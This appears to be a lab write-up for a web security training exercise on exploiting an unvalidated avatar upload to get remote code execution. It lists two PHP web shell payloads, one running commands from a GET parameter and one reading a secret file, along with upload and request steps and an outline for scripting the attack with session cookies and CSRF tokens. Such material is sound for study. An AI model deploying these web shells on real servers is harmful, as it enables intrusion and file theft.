### Lab: Remote code execution via web shell upload

This lab contains a vulnerable image upload function.
It doesn't perform any validation on the files users upload before storing them on the server's filesystem.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret.
Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter

______

Important GET / POST Requests:

[+] POST /my-account/avatar HTTP/2
[+] GET /files/avatars/<WEBSHELL>

Payload1: <?php echo system($_GET['command']); ?>
Payload2: <?php echo file_get_contents('/home/carlos/secret'); ?>

1) Upload payload1.php
2) Open WebShell for Remote Code Execution (/files/avatars/webshell.php?command=[command])
3) cat%20/home/carlos/secret

OR

1) Upload payload2.php
2) Call remote file via GET request


_____

Script Structure

!) GET /login
    1a) Extract session cookie and store it
    1b) Extract csrf token and store it
2) POST /login
    2a) Extract authenticated session cookie and store it
3) GET /login (after authentication)
    3a) Extract csrf token for the avatar upload function (second csrf token in the webpage)
4) POST /my-account/avatar
    4a) upload file (use session cookie and csrf token)


